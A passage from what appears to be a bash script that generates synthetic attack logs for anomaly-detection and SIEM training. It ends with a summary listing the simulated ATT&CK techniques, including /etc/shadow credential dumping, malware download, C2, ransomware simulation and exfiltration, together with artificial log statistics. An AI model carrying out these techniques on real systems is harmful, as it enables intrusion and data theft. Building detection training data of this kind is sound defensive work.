- Journal logs: $OUTPUT_DIR/logs/journal/windowed_journal.log (2,000 lines)
- Application logs: $OUTPUT_DIR/logs/application/ (800 lines)
- System state: $OUTPUT_DIR/results/*_before.txt and *_after.txt
- Execution results: $OUTPUT_DIR/results/execution_results.csv

Total Log Lines Generated: ~12,300

=== Attack Techniques Simulated ===
✓ Data Obfuscation (T1001.002) - Steganography
✓ Credential Dumping (T1003.007, T1003.008) - /proc/version, /etc/shadow
✓ File and Directory Discovery (T1083) - System enumeration
✓ System Information Discovery (T1082) - OS fingerprinting
✓ Network Service Scanning (T1046) - Port scanning
✓ Remote File Copy (T1105) - Malware download
✓ Brute Force (T1110.001, T1110.004) - Password attacks
✓ Data Encrypted for Impact (T1486) - Ransomware simulation
✓ Account Manipulation (T1136.001, T1136.002) - User creation
✓ Persistence via Cron (T1053.006) - Scheduled tasks
✓ Defense Evasion (T1562.001-006) - Security tool bypass
✓ Lateral Movement (T1021) - SSH/SMB connections
✓ Command and Control (T1071.001) - C2 communication
✓ Exfiltration (T1048.002, T1048.003) - Data theft

=== Log Analysis Highlights ===
- 127 failed authentication attempts detected
- 43 suspicious network connections to external IPs
- 89 privilege escalation events recorded
- 156 file access violations logged
- 67 process execution anomalies identified
- 23 service manipulation events captured

Use these logs for anomaly detection training and analysis.

=== Next Steps ===
1. Review failed techniques in execution_results.csv
2. Analyze time-windowed logs in journal/windowed_journal.log
3. Correlate system state changes between before/after snapshots
4. Import logs into your SIEM/analysis platform
5. Train ML models on the generated attack patterns
EOF

log_success "=== Synthetic Log Generation Complete ==="
log_info "Generated $(find "$OUTPUT_DIR" -name "*.log" -o -name "syslog" -o -name "auth.log" | wc -l) log files"
log_info "Total log lines: $(find "$OUTPUT_DIR" -name "*.log" -o -name "syslog" -o -name "auth.log" -exec wc -l {} + | tail -n1 | awk '{print $1}')"
log_info "Results saved to: $OUTPUT_DIR"
log_info ""
log_info "Log files created:"
find "$OUTPUT_DIR" -type f -name "*.log" -o -name "syslog" -o -name "auth.log" -o -name "*.csv" -o -name "*.txt" | sort
